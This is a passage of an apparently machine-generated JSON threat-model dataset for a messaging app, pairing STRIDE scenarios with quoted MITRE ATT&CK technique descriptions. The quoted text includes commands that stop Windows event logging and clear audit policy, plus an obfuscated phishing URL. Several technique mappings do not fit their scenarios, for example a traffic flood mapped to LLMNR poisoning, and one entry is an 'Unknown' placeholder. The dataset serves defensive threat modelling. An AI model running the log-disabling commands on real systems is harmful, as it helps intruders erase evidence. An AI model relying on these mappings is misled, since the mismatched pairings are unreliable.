                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker propagates a malicious software update that modifies application behavior or compromises data integrity.",
            "Assumptions": [
                {
                    "Assumption": "Update process does not involve thorough verification.",
                    "Role": "Application Developer",
                    "Condition": "Weak or no code signing and verification process."
                },
                {
                    "Assumption": "Users trust and install the update without questioning its authenticity.",
                    "Role": "User",
                    "Condition": "User installs unverified updates."
                },
                {
                    "Assumption": "The infrastructure distributing updates can be compromised or spoofed.",
                    "Role": "Application Developer",
                    "Condition": "Vulnerable or untrusted update distribution channels."
                }
            ],
            "Potential Impact": "Application integrity and potentially data confidentiality are compromised.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "software update",
                "code signing",
                "update process"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having sent certain messages due to no reliable logging or auditing in the application.",
            "Assumptions": [
                {
                    "Assumption": "The application does not have robust logging mechanisms.",
                    "Role": "Application Developer",
                    "Condition": "No logging features implemented."
                },
                {
                    "Assumption": "There is no established process for auditing user actions.",
                    "Role": "Application Developer",
                    "Condition": "Absence of audit trails."
                },
                {
                    "Assumption": "Users can claim their accounts were compromised without detection methods proving otherwise.",
                    "Role": "User",
                    "Condition": "Lack of compromise detection mechanisms."
                }
            ],
            "Potential Impact": "Loss of integrity and potential disputes about message authenticity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "auditing",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A companion device is used to perform actions that the primary user can later deny having authorized.",
            "Assumptions": [
                {
                    "Assumption": "No strong authentication mechanisms linking actions on companion devices to the primary user.",
                    "Role": "Application Developer",
                    "Condition": "Weak or absent authentication mechanisms."
                },
                {
                    "Assumption": "Audit logs are either not stored or are tamperable.",
                    "Role": "Application Developer",
                    "Condition": "Logs can be tampered with or are not securely stored."
                },
                {
                    "Assumption": "User can plausibly deny account usage.",
                    "Role": "User",
                    "Condition": "Lack of non-repudiation features."
                }
            ],
            "Potential Impact": "Data integrity and non-repudiation are compromised.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "companion device",
                "authentication",
                "audit log"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Logs associated with actions performed through the application can be modified or deleted without detection.",
            "Assumptions": [
                {
                    "Assumption": "Application makes use of insecure logging mechanisms.",
                    "Role": "Application Developer",
                    "Condition": "Insecure or unaudited logs."
                },
                {
                    "Assumption": "Users have permissions to access and modify logs.",
                    "Role": "User",
                    "Condition": "Excessive user permissions."
                },
                {
                    "Assumption": "There are no alerts or checks for log modifications.",
                    "Role": "Application Developer",
                    "Condition": "Lack of log integrity monitoring."
                }
            ],
            "Potential Impact": "Loss of integrity and accountability in user actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "integrity monitoring",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exploiting a vulnerability in the encrypted storage of SQLite databases to access pre-keys and authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "The SQLite database encryption is weak or improperly implemented.",
                    "Role": "Application Developer",
                    "Condition": "Insecure encryption practices."
                },
                {
                    "Assumption": "Attacker can access these databases through device compromise or backup exploitation.",
                    "Role": "Attacker",
                    "Condition": "Physical or logical access to device or backups."
                },
                {
                    "Assumption": "No additional encryption layers protecting sensitive data in the database.",
                    "Role": "Application Developer",
                    "Condition": "Single layer encryption."
                }
            ],
            "Potential Impact": "Loss of data confidentiality and potential unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database",
                "encryption",
                "credentials"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted metadata of messages in transit, which could reveal communication patterns.",
            "Assumptions": [
                {
                    "Assumption": "Messaging applications do not encrypt all metadata.",
                    "Role": "Application Developer",
                    "Condition": "Incomplete encryption practices."
                },
                {
                    "Assumption": "Attacker is positioned to intercept the metadata.",
                    "Role": "Attacker",
                    "Condition": "Network position enables data sniffing."
                },
                {
                    "Assumption": "Metadata includes sensitive information like user identity or communication timing.",
                    "Role": "Application Developer",
                    "Condition": "Sensitive metadata exposed in transit."
                }
            ],
            "Potential Impact": "Compromise of communication privacy and potential exposure of user activity patterns.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "metadata",
                "encryption",
                "network communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Backup files containing encrypted messages are intercepted and decrypted due to weak backup protection mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "Backups are not securely encrypted or protected.",
                    "Role": "Application Developer",
                    "Condition": "Weak encryption or storage practices for backups."
                },
                {
                    "Assumption": "Backups are accessible to unauthorized actors.",
                    "Role": "Attacker",
                    "Condition": "Compromised access to storage solutions."
                },
                {
                    "Assumption": "Attackers have resources to break weak encryption schemes.",
                    "Role": "Attacker",
                    "Condition": "Sophisticated decryption capabilities."
                }
            ],
            "Potential Impact": "Loss of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "backup",
                "encryption",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the messaging service with a high volume of traffic, making it unavailable to legitimate users.",
            "Assumptions": [
                {
                    "Assumption": "The messaging service lacks adequate DDoS protections.",
                    "Role": "Application Developer",
                    "Condition": "Insufficient DDoS mitigation strategies."
                },
                {
                    "Assumption": "Attacker has access to botnet or resources to generate high traffic volumes.",
                    "Role": "Attacker",
                    "Condition": "Capable of sustained traffic generation."
                },
                {
                    "Assumption": "Service capacity is unable to handle unexpected traffic spikes.",
                    "Role": "Application Developer",
                    "Condition": "Limited service scaling capabilities."
                }
            ],
            "Potential Impact": "Loss of service availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flooding",
                "network",
                "availability"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a server-side vulnerability to crash the messaging server, rendering it inoperable.",
            "Assumptions": [
                {
                    "Assumption": "Server-side vulnerabilities exist.",
                    "Role": "Application Developer",
                    "Condition": "Unpatched vulnerabilities or new exploits."
                },
                {
                    "Assumption": "No effective server monitoring and recovery protocols in place.",
                    "Role": "Application Developer",
                    "Condition": "Lack of proactive recovery mechanisms."
                },
                {
                    "Assumption": "Attacker is aware of and can exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and tools to exploit server vulnerability."
                }
            ],
            "Potential Impact": "Loss of service availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability exploitation",
                "server crash",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed data packets that cause the messaging application to crash for all connected users.",
            "Assumptions": [
                {
                    "Assumption": "Application has weaknesses in data validation and handling.",
                    "Role": "Application Developer",
                    "Condition": "Insufficient data validation protocols."
                },
                {
                    "Assumption": "Attackers can send packets directly to the application server.",
                    "Role": "Attacker",
                    "Condition": "Network access to targeted servers."
                },
                {
                    "Assumption": "No mechanisms to detect and filter malformed data packets.",
                    "Role": "Application Developer",
                    "Condition": "Lack of input validation and filtering mechanisms."
                }
            ],
            "Potential Impact": "Loss of service availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "packet injection",
                "data validation",
                "application crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the companion device application to gain administrative privileges and manipulate messaging functionalities.",
            "Assumptions": [
                {
                    "Assumption": "The vulnerability exists in current or unpatched versions of the application.",
                    "Role": "Application Developer",
                    "Condition": "Unpatched or insecure application versions."
                },
                {
                    "Assumption": "Companion device security mechanisms are bypassable.",
                    "Role": "Attacker",
                    "Condition": "Insufficiently secure companion device mechanisms."
                },
                {
                    "Assumption": "Users may unintentionally install malicious updates or plugins.",
                    "Role": "User",
                    "Condition": "User action leads to installation of compromised components."
                }
            ],
            "Potential Impact": "Unauthorized access and control over messaging functionalities.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "administrative access",
                "companion device"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick an admin user into providing credentials, gaining elevated access to the messaging system.",
            "Assumptions": [
                {
                    "Assumption": "Admin users can be tricked through social engineering tactics.",
                    "Role": "Admin User",
                    "Condition": "Vulnerable to phishing and social engineering."
                },
                {
                    "Assumption": "No multi-factor authentication in place for admin operations.",
                    "Role": "Application Developer",
                    "Condition": "Lack of strong authentication mechanisms."
                },
                {
                    "Assumption": "Admin users have broad access once authenticated.",
                    "Role": "Application Developer",
                    "Condition": "High privilege without oversight or checks."
                }
            ],
            "Potential Impact": "Unauthorized access and potential manipulation of system functions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "credential theft",
                "admin access"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker bypasses client-side input validation checks to perform actions with higher privileges than intended.",
            "Assumptions": [
                {
                    "Assumption": "Client-side validations are not replicated server-side.",
                    "Role": "Application Developer",
                    "Condition": "Client-side only validation checks."
                },
                {
                    "Assumption": "Attacker has knowledge of the application's validation mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Understanding of application\u2019s input validation."
                },
                {
                    "Assumption": "The server trusts input from client applications.",
                    "Role": "Application Developer",
                    "Condition": "Server-side lacks input validation."
                }
            ],
            "Potential Impact": "Unauthorized access to perform restricted actions with elevated privileges.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "input validation",
                "client-server trust",
                "restricted actions"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "8",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake login page for the messaging application to steal user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users might not identify the subtle differences in the fake login page.",
                    "Role": "User",
                    "Condition": "Valid if users are not trained to recognize phishing attempts."
                },
                {
                    "Assumption": "The attacker has access to create web pages that look similar to the legitimate application.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has web development skills."
                },
                {
                    "Assumption": "Users are tricked into visiting the fake page through phishing emails or malicious links.",
                    "Role": "Attacker/User",
                    "Condition": "Valid if users do not verify sources of received emails or messages."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of authentication credentials.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credential harvesting",
                "social engineering",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
